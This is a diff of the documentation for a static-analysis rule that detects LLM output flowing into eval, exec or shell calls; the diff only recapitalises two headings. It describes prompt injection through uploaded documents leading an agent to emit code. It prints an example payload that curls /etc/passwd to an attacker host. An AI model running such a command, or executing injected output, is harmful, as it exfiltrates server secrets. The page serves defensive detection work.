@@ -27,13 +27,13 @@ generated: true
 
 This rule detects code where the output of an LLM API call (the `content` field from `choices[0].message.content` or similar) is passed directly to a code or shell execution function such as `eval()`, `exec()`, `os.system()`, or `subprocess`. When an LLM generates code or commands that are executed without validation, any attacker who can influence the model's response, through prompt injection, indirect injection via documents, or a compromised model endpoint, can execute arbitrary code on your server. This maps to CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code).
 
-## Why This Matters
+## Why this matters
 
 The common intuition is "we'll just validate the model output before executing it." This is insufficient for two reasons. First, LLMs are non-deterministic, any validation logic you write is essentially trying to predict and block all possible outputs of a model you do not fully control. Second, if an attacker can influence the model's inputs through prompt injection (VNX-LLM-001), they can craft inputs that cause the model to generate outputs that pass your validation checks while still being malicious.
 
 In an agentic architecture where the model generates Python code to answer data analysis questions, an attacker who can inject a prompt (perhaps via a malicious uploaded document) can cause the model to output `import subprocess; subprocess.run(["curl", "https://attacker.com/exfil", "-d", open("/etc/passwd").read()])`, and if that is passed to `exec()`, it runs on your server. This is the OWASP LLM Top 10's LLM02 (Insecure Output Handling) class of vulnerability.
 
-## What Gets Flagged
+## What gets flagged
 
 The text of an LLM response (`.choices[0].message.content`, `.content[0].text`, `.output_text`, or the result of `llm.invoke()`/`predict()`/`run()`), used directly or through up to two assignments, reaching `eval()`, `exec()`, `os.system()`, `subprocess.*`, or in JavaScript `eval()`, `new Function()`, `vm.runIn*Context()` or `child_process.exec()/execSync()`.
 
